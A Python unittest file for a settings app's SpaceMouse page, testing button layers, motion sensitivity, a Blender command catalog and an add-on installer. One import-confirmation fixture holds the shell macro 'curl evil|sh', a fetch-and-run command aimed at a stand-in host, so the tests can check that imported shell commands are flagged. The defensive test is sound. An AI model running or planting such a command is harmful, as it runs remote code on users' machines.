"""Layers, cap motion, app commands and the Blender add-on installer of the settings app's SpaceMouse page."""

import json
import subprocess
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

try:
    import gi  # noqa: F401
    from gi.repository import GLib  # noqa: F401
except ImportError:  # pragma: no cover
    gi = None

from config.schema import (
    MOTION_DEFAULTS,
    Profile,
    ProfileContext,
    SpaceMouseAction,
    SpaceMouseButton,
    SPACEMOUSE_LAYERS_MAX,
    _default_config,
    config_from_text,
    effective_motion,
    merge_portable,
    settings_from_text,
    shell_commands,
    _encoder,
)
from spacemouse_devices import SPACEPILOT_PRO

if gi is not None:
    from config_app import blender_addon
    from config_app import spacemouse as sm
    from config_app import spacemouse_extra as sx


def press(action):
    return SpaceMouseButton(press=action)


def config_with_layers():
    config = _default_config()
    config.spacemouse.buttons = {"0": press(SpaceMouseAction("layer", layer="Shift", layer_mode="hold"))}
    config.spacemouse.layers = {"Shift": {"13": press(SpaceMouseAction("macro", keys=["KEY_LEFTCTRL", "KEY_Z"]))}}
    return config


@unittest.skipIf(gi is None, "needs PyGObject")
class ActionEditorTests(unittest.TestCase):
    def test_new_choices_are_offered_and_round_trip(self):
        keys = {key for key, _label in sm.supported_choices()}
        self.assertTrue({"layer", "motion", "app"} <= keys)
        for choice in ("layer", "motion", "app"):
            self.assertEqual(sm.choice_of(sm.new_action(choice)), choice)

    def test_a_layer_action_takes_the_first_layer_and_keeps_its_own(self):
        action = sm.new_action("layer", layers=["A", "B"])
        self.assertEqual((action.layer, action.layer_mode), ("A", "hold"))
        action.layer, action.layer_mode = "B", "toggle"
        again = sm.new_action("layer", action, layers=["A"])
        self.assertEqual((again.layer, again.layer_mode), ("B", "toggle"))
        self.assertIsNone(sm.new_action("layer").layer)

    def test_an_app_action_keeps_the_keys_of_a_shortcut(self):
        macro = SpaceMouseAction("macro", keys=["KEY_E"])
        action = sm.new_action("app", macro)
        self.assertEqual((action.command, action.keys), (None, ["KEY_E"]))
        self.assertIsNone(sm.new_action("app", SpaceMouseAction("dial")).keys)
        kept = sm.new_action("app", SpaceMouseAction("app", command="mesh.bevel", keys=["KEY_B"]))
        self.assertEqual(kept.command, "mesh.bevel")

    def test_validity(self):
        self.assertFalse(sm.is_valid(SpaceMouseAction("layer")))
        self.assertFalse(sm.is_valid(SpaceMouseAction("layer", layer="  ")))
        self.assertTrue(sm.is_valid(SpaceMouseAction("layer", layer="Shift", layer_mode="hold")))
        self.assertFalse(sm.is_valid(SpaceMouseAction("app")))
        self.assertTrue(sm.is_valid(SpaceMouseAction("app", command="view.frame_selected")))
        self.assertTrue(sm.is_valid(SpaceMouseAction("motion", motion="reset")))

    def test_descriptions(self):
        self.assertEqual(sm.describe_action(SpaceMouseAction("layer", layer="Shift", layer_mode="hold")), "Layer: Shift (hold)")
        self.assertEqual(sm.describe_action(SpaceMouseAction("layer", layer="Shift", layer_mode="latch")), "Layer: Shift (once)")
        self.assertEqual(sm.describe_action(SpaceMouseAction("layer", layer="Shift", layer_mode="toggle")), "Layer: Shift (toggle)")
        self.assertEqual(sm.describe_action(SpaceMouseAction("layer")), "Layer: not set")
        self.assertEqual(sm.describe_action(SpaceMouseAction("motion", motion="rotation")), "Cap: rotation on / off")
        self.assertEqual(sm.describe_action(SpaceMouseAction("motion", motion="faster")), "Cap: faster")
        self.assertEqual(sm.describe_action(SpaceMouseAction("app")), "App command not set")
        action = SpaceMouseAction("app", command="mesh.bevel", keys=["KEY_LEFTCTRL", "KEY_B"])
        self.assertEqual(sm.describe_action(action), "App: mesh.bevel (Ctrl+B)")
        self.assertEqual(sm.describe_action(action, {"mesh.bevel": "Bevel"}), "App: Bevel (Ctrl+B)")
        self.assertEqual(sm.describe_button(press(action), titles={"mesh.bevel": "Bevel"}), "App: Bevel (Ctrl+B)")


@unittest.skipIf(gi is None, "needs PyGObject")
class LayerTests(unittest.TestCase):
    def test_names_of_a_scope(self):
        config = config_with_layers()
        profile = Profile(name="Blender", app_id="blender", spacemouse_layers={"Edit": {}, "Shift": {}})
        config.profiles.append(profile)
        self.assertEqual(sx.layer_names(config, None), ["Shift"])
        self.assertEqual(sx.layer_names(config, profile), ["Shift", "Edit"])
        # A global button may switch to a layer only an application defines.
        self.assertEqual(sx.action_layer_names(config, None), ["Shift", "Edit"])
        self.assertTrue(sx.is_inherited_layer(config, Profile(name="Other", app_id="x"), "Shift"))
        self.assertFalse(sx.is_inherited_layer(config, profile, "Shift"))

    def test_add_checks_the_name(self):
        config = config_with_layers()
        profile = Profile(name="Blender", app_id="blender", spacemouse_layers={"Edit": {}})
        config.profiles.append(profile)
        self.assertEqual(sx.add_layer(config, None, "  Alt   layer "), "Alt layer")
        self.assertIn("Alt layer", config.spacemouse.layers)
        for scope, name in ((None, ""), (None, "shift"), (None, "EDIT"), (profile, "SHIFT"), (profile, "edit")):
            with self.assertRaises(ValueError, msg=name):
                sx.add_layer(config, scope, name)
        self.assertEqual(sx.add_layer(config, profile, "Sculpt"), "Sculpt")
        self.assertNotIn("Sculpt", config.spacemouse.layers)

    def test_at_most_the_schema_limit(self):
        config = _default_config()
        for number in range(SPACEMOUSE_LAYERS_MAX):
            sx.add_layer(config, None, f"L{number}")
        with self.assertRaises(ValueError):
            sx.add_layer(config, None, "one more")

    def test_rename_follows_the_actions_and_the_profile_maps(self):
        config = config_with_layers()
        profile = Profile(name="Blender", app_id="blender", spacemouse_layers={"Shift": {"2": press(SpaceMouseAction("back"))}})
        profile.spacemouse_buttons = {"5": press(SpaceMouseAction("layer", layer="Shift", layer_mode="latch"))}
        profile.contexts = [ProfileContext(name="Edit", spacemouse_layers={"Shift": {}})]
        config.profiles.append(profile)
        self.assertEqual(sx.rename_layer(config, None, "Shift", "Modifiers"), "Modifiers")
        self.assertEqual(list(config.spacemouse.layers), ["Modifiers"])
        self.assertEqual(config.spacemouse.buttons["0"].press.layer, "Modifiers")
        self.assertEqual(list(profile.spacemouse_layers), ["Modifiers"])
        self.assertEqual(list(profile.contexts[0].spacemouse_layers), ["Modifiers"])
        self.assertEqual(profile.spacemouse_buttons["5"].press.layer, "Modifiers")

    def test_rename_refuses_what_belongs_to_all_applications(self):
        config = config_with_layers()
        profile = Profile(name="Blender", app_id="blender", spacemouse_layers={"Shift": {}, "Own": {}})
        other = Profile(name="Other", app_id="other")
        config.profiles += [profile, other]
        with self.assertRaises(ValueError):
            sx.rename_layer(config, profile, "Shift", "X")  # a map of the global layer
        with self.assertRaises(ValueError):
            sx.rename_layer(config, other, "Shift", "X")  # inherited only
        with self.assertRaises(ValueError):
            sx.rename_layer(config, None, "Shift", "Own")  # a profile's layer is called that
        self.assertEqual(sx.rename_layer(config, profile, "Own", "Mine"), "Mine")
        self.assertEqual(sx.rename_layer(config, profile, "Mine", "Mine"), "Mine")

    def test_remove_clears_the_actions_that_switched_to_it(self):
        config = config_with_layers()
        profile = Profile(name="Blender", app_id="blender", spacemouse_layers={"Shift": {}})
        profile.spacemouse_buttons = {"5": press(SpaceMouseAction("layer", layer="Shift", layer_mode="latch"))}
        config.profiles.append(profile)
        self.assertEqual(sx.layer_users(config, None, "Shift"), 2)
        self.assertEqual(sx.remove_layer(config, None, "Shift"), 2)
        self.assertEqual(config.spacemouse.layers, {})
        self.assertEqual(profile.spacemouse_layers, {})
        self.assertEqual(config.spacemouse.buttons["0"].press.type, "none")
        self.assertEqual(profile.spacemouse_buttons["5"].press.type, "none")

    def test_removing_a_profiles_map_of_a_global_layer_keeps_the_layer(self):
        config = config_with_layers()
        profile = Profile(name="Blender", app_id="blender", spacemouse_layers={"Shift": {}})
        config.profiles.append(profile)
        self.assertEqual(sx.remove_layer(config, profile, "Shift"), 0)
        self.assertEqual(profile.spacemouse_layers, {})
        self.assertIn("Shift", config.spacemouse.layers)
        self.assertEqual(config.spacemouse.buttons["0"].press.type, "layer")

    def test_empty_layers_survive_saving(self):
        config = _default_config()
        sx.add_layer(config, None, "Empty")
        again = config_from_text(json.dumps(_encoder(config)))
        self.assertEqual(again.spacemouse.layers, {"Empty": {}})


IMPORTED = json.dumps({
    "turnpad_settings": 1,
    "spacemouse": {"layers": {"Fn": {"12": {"press": {"type": "macro", "macro": [{"type": "shell", "script": "curl evil|sh"}]}}}}},
})


class ImportConfirmationTests(unittest.TestCase):
    def test_a_shell_command_in_an_imported_layer_is_listed(self):
        merged = merge_portable(_default_config(), settings_from_text(IMPORTED))
        self.assertIn("curl evil|sh", [command for _owner, _where, command in shell_commands(
            merged.profiles, merged.spacemouse.buttons, merged.spacemouse.layers)])
        # Without the layers argument it would have gone unnoticed.
        self.assertNotIn("curl evil|sh", [command for _o, _w, command in shell_commands(
            merged.profiles, merged.spacemouse.buttons)])

    def test_the_app_always_hands_the_global_layers_to_shell_commands(self):
        import re
        source = (ROOT / "config_app" / "main.py").read_text()
        calls = re.findall(r"shell_commands\(([^)]*)\)", source)
        self.assertTrue(calls)
        for arguments in calls:
            self.assertIn("layers", arguments)


@unittest.skipIf(gi is None, "needs PyGObject")
class BindingTests(unittest.TestCase):
    def setUp(self):
        self.config = config_with_layers()
        self.profile = Profile(name="Blender", app_id="blender")
        self.config.profiles.append(self.profile)

    def test_base_binding_shows_through_a_layer(self):
        button, source = sx.current_binding(self.config, None, "Shift", 22)
        self.assertEqual(source, None)  # the stored global map has no Esc
        self.config.spacemouse.buttons["22"] = press(SpaceMouseAction("back"))
        button, source = sx.current_binding(self.config, None, "Shift", 22)
        self.assertEqual((button.press.type, source), ("back", "base"))
        button, source = sx.current_binding(self.config, None, "Shift", 13)
        self.assertEqual((button.press.type, source), ("macro", "layer"))
        self.assertEqual(sx.current_binding(self.config, None, None, 22)[1], "global")

    def test_a_profile_sees_the_global_layer_and_its_own_over_it(self):
        self.assertEqual(sx.current_binding(self.config, self.profile, "Shift", 13)[1], "global-layer")
        self.profile.spacemouse_layers = {"Shift": {"13": press(SpaceMouseAction("select"))}}
        button, source = sx.current_binding(self.config, self.profile, "Shift", 13)
        self.assertEqual((button.press.type, source), ("select", "layer"))
        self.assertTrue(sx.owns(self.config, self.profile, "Shift", 13))
        self.assertFalse(sx.owns(self.config, self.profile, "Shift", 14))

    def test_a_label_only_entry_names_the_binding_below(self):
        self.config.spacemouse.buttons["22"] = press(SpaceMouseAction("back"))
        self.config.spacemouse.layers["Shift"]["22"] = SpaceMouseButton(label="Close")
        button, source = sx.current_binding(self.config, None, "Shift", 22)
        self.assertEqual((button.press.type, button.label, source), ("back", "Close", "base"))

    def test_store_and_drop_in_a_layer(self):
        sx.store_binding(self.config, None, "Shift", 14, SpaceMouseButton(press=SpaceMouseAction("dial")))
        self.assertEqual(self.config.spacemouse.layers["Shift"]["14"].press.type, "dial")
        sx.store_binding(self.config, None, "Shift", 15, SpaceMouseButton())
        self.assertEqual(self.config.spacemouse.layers["Shift"]["15"].press.type, "none")  # an explicit pass through
        sx.drop_binding(self.config, None, "Shift", 14)
        self.assertNotIn("14", self.config.spacemouse.layers["Shift"])
        sx.store_binding(self.config, self.profile, "Shift", 14, SpaceMouseButton(press=SpaceMouseAction("back")))
        self.assertEqual(self.profile.spacemouse_layers["Shift"]["14"].press.type, "back")
        self.assertNotIn("14", self.config.spacemouse.layers["Shift"])  # the global layer is not touched

    def test_the_base_map_is_edited_as_before(self):
        sx.store_binding(self.config, self.profile, None, 7, SpaceMouseButton(press=SpaceMouseAction("select")))
        self.assertEqual(self.profile.spacemouse_buttons["7"].press.type, "select")
        sx.store_binding(self.config, None, None, 7, SpaceMouseButton(press=SpaceMouseAction("back")))
        self.assertEqual(self.config.spacemouse.buttons["7"].press.type, "back")

    def test_row_text_names_where_a_binding_comes_from(self):
        self.config.spacemouse.buttons["22"] = press(SpaceMouseAction("back"))
        rows = {row.indexes[0]: row for row in sx.sm.key_rows(SPACEPILOT_PRO)}
        text, _tooltip, dim = sx.row_info(self.config, None, "Shift", rows[22])
        self.assertEqual((text, dim), ("Back · from base", True))
        text, _tooltip, dim = sx.row_info(self.config, None, "Shift", rows[13])
        self.assertEqual(dim, False)
        self.assertNotIn("from", text)
        text, _tooltip, dim = sx.row_info(self.config, self.profile, "Shift", rows[13])
        self.assertEqual((text.endswith("from All applications"), dim), (True, True))
        text, _tooltip, dim = sx.row_info(self.config, self.profile, None, rows[22])
        self.assertEqual((text, dim), ("Back · from All applications", True))
        text, _tooltip, dim = sx.row_info(self.config, None, None, rows[22])
        self.assertEqual((text, dim), ("Back", False))

    def test_every_map_is_known_to_the_key_list(self):
        self.profile.spacemouse_layers = {"X": {"50": press(SpaceMouseAction("back"))}}
        rows = sm.key_rows(SPACEPILOT_PRO, sx.all_maps(self.config))
        self.assertIsNotNone(sm.row_for_index(rows, 50))


@unittest.skipIf(gi is None, "needs PyGObject")
class MotionTests(unittest.TestCase):
    def test_the_slider_is_logarithmic_and_neutral_in_the_middle(self):
        self.assertEqual(sx.sensitivity_from_position(0), 0.1)
        self.assertEqual(sx.sensitivity_from_position(50), 1.0)
        self.assertEqual(sx.sensitivity_from_position(100), 4.0)
        self.assertEqual(sx.sensitivity_from_position(-5), 0.1)
        self.assertEqual(sx.sensitivity_from_position(500), 4.0)
        for value in (0.1, 0.25, 0.5, 1.0, 1.5, 2.0, 3.0, 4.0):
            self.assertAlmostEqual(sx.sensitivity_from_position(sx.position_from_sensitivity(value)), value, delta=0.06 * value)
        self.assertLess(sx.sensitivity_from_position(30), sx.sensitivity_from_position(60))

    def test_global_settings_keep_only_what_differs_from_the_defaults(self):
        config = _default_config()
        sx.set_motion(config, None, "sensitivity", 1.5)
        sx.set_motion(config, None, "rotation", False)
        sx.set_motion(config, None, "invert", True, index=2)
        sx.set_motion(config, None, "axis_sensitivity", 0.0, index=5)
        self.assertEqual(config.spacemouse.motion, {
            "sensitivity": 1.5, "rotation": False, "invert": [False, False, True, False, False, False],
            "axis_sensitivity": [1.0, 1.0, 1.0, 1.0, 1.0, 0.0],
        })
        sx.set_motion(config, None, "sensitivity", 1.0)
        sx.set_motion(config, None, "rotation", True)
        sx.set_motion(config, None, "invert", False, index=2)
        sx.set_motion(config, None, "axis_sensitivity", 1.0, index=5)
        self.assertEqual(config.spacemouse.motion, {})  # nothing differs: spacenavd stays as it is

    def test_a_profile_override_is_a_whole_snapshot(self):
        config = _default_config()
        config.spacemouse.motion = {"sensitivity": 2.0}
        profile = Profile(name="Blender", app_id="blender")
        self.assertFalse(sx.motion_overridden(profile))
        sx.use_global_motion(profile, False, config)
        self.assertTrue(sx.motion_overridden(profile))
        self.assertEqual(profile.spacemouse_motion["sensitivity"], 2.0)
        sx.set_motion(config, profile, "sensitivity", 1.0)
        self.assertEqual(profile.spacemouse_motion["sensitivity"], 1.0)  # kept although it is the default
        self.assertEqual(effective_motion(config.spacemouse.motion, profile.spacemouse_motion)["sensitivity"], 1.0)
        self.assertEqual(config.spacemouse.motion, {"sensitivity": 2.0})
        sx.use_global_motion(profile, True, config)
        self.assertEqual(profile.spacemouse_motion, {})
        self.assertEqual(sx.motion_shown(config, profile)["sensitivity"], 2.0)

    def test_reset(self):
        config = _default_config()
        profile = Profile(name="Blender", app_id="blender", spacemouse_motion={"sensitivity": 2.0})
        config.spacemouse.motion = {"rotation": False}
        sx.reset_motion(config, profile)
        self.assertEqual(profile.spacemouse_motion, {})
        sx.reset_motion(config, None)
        self.assertEqual(config.spacemouse.motion, {})
        self.assertEqual(sx.motion_shown(config, None), MOTION_DEFAULTS)

    def test_the_status_line(self):
        self.assertIn("not known", sx.motion_status(None))
        self.assertEqual(
            sx.motion_status({"sensitivity": 1.5, "rotation": False, "translation": True}),
            "Now: ×1.5, rotation off — set with the device's buttons",
        )
        self.assertEqual(
            sx.motion_status({"sensitivity": 1.0, "rotation": True, "translation": True}),
            "Now: ×1, rotation and pan/zoom on — set with the device's buttons",
        )
        self.assertIn("rotation off, pan and zoom off", sx.motion_status({"sensitivity": 0.5, "rotation": False, "translation": False}))

    def test_driver_state_text(self):
        self.assertEqual(sx.parse_driver_state(json.dumps({"layer": "Shift"})), {"layer": "Shift"})
        self.assertEqual(sx.parse_driver_state("nonsense"), {})
        self.assertEqual(sx.parse_driver_state("[1]"), {})
        self.assertEqual(sx.parse_driver_state(None), {})


CATALOG = json.dumps({
    "app": "blender", "name": "Blender", "version": "5.2.0", "connected": True, "context": {"mode": "OBJECT"},
    "commands": [
        {"id": "view.frame_selected", "title": "Frame selected", "category": "View", "keys": "Numpad ."},
        {"id": "mesh.bevel", "title": "Bevel", "category": "Modeling", "keys": "Ctrl+B", "modes": ["EDIT_MESH"]},
        {"id": "mesh.extrude_region_move", "title": "Extrude", "category": "Modeling", "keys": "E"},
        {"id": "", "title": "no id"},
        "junk",
        {"id": "wm.thing", "title": "Thing"},
    ],
})


@unittest.skipIf(gi is None, "needs PyGObject")
class CatalogTests(unittest.TestCase):
    def test_parse(self):
        catalog = sx.parse_catalog(CATALOG)
        self.assertEqual((catalog.name, catalog.version, catalog.connected), ("Blender", "5.2.0", True))
        self.assertEqual([command.id for command in catalog.commands],
                         ["view.frame_selected", "mesh.bevel", "mesh.extrude_region_move", "wm.thing"])
        self.assertEqual(catalog.find("mesh.bevel").modes, ("EDIT_MESH",))
        self.assertEqual(catalog.titles()["mesh.bevel"], "Bevel")
        self.assertTrue(catalog.known)

    def test_unusable_replies_are_empty_catalogs(self):
        for text in (None, "", "nonsense", "[]", json.dumps({"commands": "x"})):
            self.assertFalse(sx.parse_catalog(text).known)

    def test_search_matches_every_word_in_any_field(self):
        commands = sx.parse_catalog(CATALOG).commands
        self.assertEqual(len(sx.filter_commands(commands, "")), 4)
        self.assertEqual([c.id for c in sx.filter_commands(commands, "bevel")], ["mesh.bevel"])
        self.assertEqual([c.id for c in sx.filter_commands(commands, "MODELING ext")], ["mesh.extrude_region_move"])
        self.assertEqual([c.id for c in sx.filter_commands(commands, "ctrl+b")], ["mesh.bevel"])
        self.assertEqual(sx.filter_commands(commands, "nothing like this"), [])

    def test_grouping_keeps_the_catalog_order(self):
        groups = sx.grouped_commands(sx.parse_catalog(CATALOG).commands)
        self.assertEqual([name for name, _commands in groups], ["View", "Modeling", "Other"])
        self.assertEqual(len(groups[1][1]), 2)

    def test_default_keys_become_fallback_keys(self):
        catalog = sx.parse_catalog(CATALOG)
        self.assertEqual(sx.fallback_keys(catalog.find("mesh.bevel")), ["KEY_LEFTCTRL", "KEY_B"])
        self.assertEqual(sx.fallback_keys(catalog.find("mesh.extrude_region_move")), ["KEY_E"])
        self.assertIsNone(sx.fallback_keys(catalog.find("wm.thing")))  # no keys
        self.assertIsNone(sx.fallback_keys(sx.AppCommand("x", "X", keys="Mouse gesture")))
        self.assertIsNone(sx.fallback_keys(None))

    def test_status_lines(self):
        self.assertIn("Connected to Blender 5.2.0 · 4 commands", sx.describe_catalog(sx.parse_catalog(CATALOG)))
        offline = json.loads(CATALOG)
        offline["connected"] = False
        self.assertIn("last time", sx.describe_catalog(sx.parse_catalog(json.dumps(offline))))
        self.assertIn("No command list yet", sx.describe_catalog(sx.Catalog()))

    def test_the_application_asked_for(self):
        self.assertEqual(sx.app_name_for(Profile(name="B", app_id="org.blender.Blender.desktop")), "org.blender.Blender.desktop")
        self.assertEqual(sx.app_name_for(Profile(name="All", app_id=None)), "")
        self.assertEqual(sx.app_name_for(None), "")


class FakeRunner:
    """Stands in for subprocess.run: records the commands, answers by their words."""

    def __init__(self, fail=None):
        self.commands = []
        self.fail = fail

    def __call__(self, command, **kwargs):
        self.commands.append(command)
        if "build" in command:
            out = Path(command[command.index("--output-dir") + 1])
            (out / "turnpad-1.0.0.zip").write_bytes(b"zip")
        code = 1 if self.fail and self.fail in command else 0
        return subprocess.CompletedProcess(command, code, stdout="out\n", stderr="err\n" if code else "")


@unittest.skipIf(gi is None, "needs PyGObject")
class BlenderAddonTests(unittest.TestCase):
    def test_the_add_on_is_part_of_the_program(self):
        self.assertTrue((blender_addon.addon_source() / "blender_manifest.toml").is_file())
        self.assertNotEqual(blender_addon.manifest_version(blender_addon.addon_source()), "0")

    def test_the_zip_has_the_files_at_its_root_and_no_caches(self):
        with tempfile.TemporaryDirectory() as directory:
            source = Path(directory, "turnpad")
            (source / "__pycache__").mkdir(parents=True)
            (source / "sub").mkdir()
            (source / "blender_manifest.toml").write_text('version = "2.5.1"\nid = "turnpad"\n')
            (source / "__init__.py").write_text("")
            (source / "sub" / "x.py").write_text("")
            (source / "__pycache__" / "x.cpython-312.pyc").write_bytes(b"")
            built = blender_addon.build_zip(source, Path(directory, "out"))
            self.assertEqual(built.name, "turnpad-2.5.1.zip")
            with zipfile.ZipFile(built) as archive:
                self.assertEqual(sorted(archive.namelist()), ["__init__.py", "blender_manifest.toml", "sub/x.py"])

    def test_the_real_add_on_zips_with_its_manifest_at_the_root(self):
        with tempfile.TemporaryDirectory() as directory:
            built = blender_addon.build_zip(blender_addon.addon_source(), directory)
            with zipfile.ZipFile(built) as archive:
                names = archive.namelist()
            self.assertIn("blender_manifest.toml", names)
            self.assertIn("__init__.py", names)
            self.assertFalse([name for name in names if "__pycache__" in name or name.endswith(".pyc")])

    def test_blender_builds_and_installs_it(self):
        runner = FakeRunner()
        with tempfile.TemporaryDirectory() as directory:
            result = blender_addon.install(blender="/usr/bin/blender", out_dir=directory, runner=runner)
            self.assertTrue(result.ok)
            self.assertEqual(result.method, "blender")
            build, install = runner.commands
            self.assertEqual(build[:5], ["/usr/bin/blender", "--command", "extension", "build", "--source-dir"])
            self.assertEqual(build[5], str(blender_addon.addon_source()))
            self.assertEqual(build[6:], ["--output-dir", directory])
            self.assertEqual(install[:7], ["/usr/bin/blender", "--command", "extension", "install-file", "-r", "user_default", "-e"])
            self.assertEqual(install[7], str(Path(directory, "turnpad-1.0.0.zip")))
            self.assertIn("$ /usr/bin/blender --command extension build", result.log)

    def test_a_failing_blender_leaves_a_zip_and_the_manual_steps(self):
        with tempfile.TemporaryDirectory() as directory:
            result = blender_addon.install(
                blender="/usr/bin/blender", out_dir=directory, runner=FakeRunner(fail="install-file"),
            )
            self.assertFalse(result.ok)
            self.assertEqual(result.method, "zip")
            self.assertTrue(result.zip_path.is_file())
            self.assertIn("Install from Disk", result.manual)
            self.assertIn("exit code 1", result.log)

    def test_a_blender_that_cannot_run_is_reported(self):
        def broken(command, **kwargs):
            raise FileNotFoundError("blender")

        with tempfile.TemporaryDirectory() as directory:
            result = blender_addon.install(blender="/nowhere/blender", out_dir=directory, runner=broken)
            self.assertFalse(result.ok)
            self.assertIn("blender", result.log)
            self.assertTrue(result.zip_path.is_file())

    def test_without_blender_only_the_zip_is_built(self):
        runner = FakeRunner()
        with tempfile.TemporaryDirectory() as directory:
            result = blender_addon.install(blender=None, out_dir=directory, runner=runner)
            self.assertEqual(runner.commands, [])
            self.assertFalse(result.ok)
            self.assertEqual(result.method, "zip")
            self.assertEqual(result.zip_path.parent, Path(directory))
            self.assertIn("Edit › Preferences", result.manual)

    def test_the_group_is_shown_for_a_blender_profile_or_an_installed_blender(self):
        blender = Profile(name="Blender", app_id="org.blender.Blender.desktop")
        other = Profile(name="Krita", app_id="org.kde.krita.desktop")
        nothing = lambda _name: None  # noqa: E731
        self.assertTrue(blender_addon.blender_wanted([other, blender], which=nothing))
        self.assertFalse(blender_addon.blender_wanted([other, Profile(name="All", app_id=None)], which=nothing))
        self.assertTrue(blender_addon.blender_wanted([other], which=lambda _name: "/usr/bin/blender"))


if __name__ == "__main__":
    unittest.main()
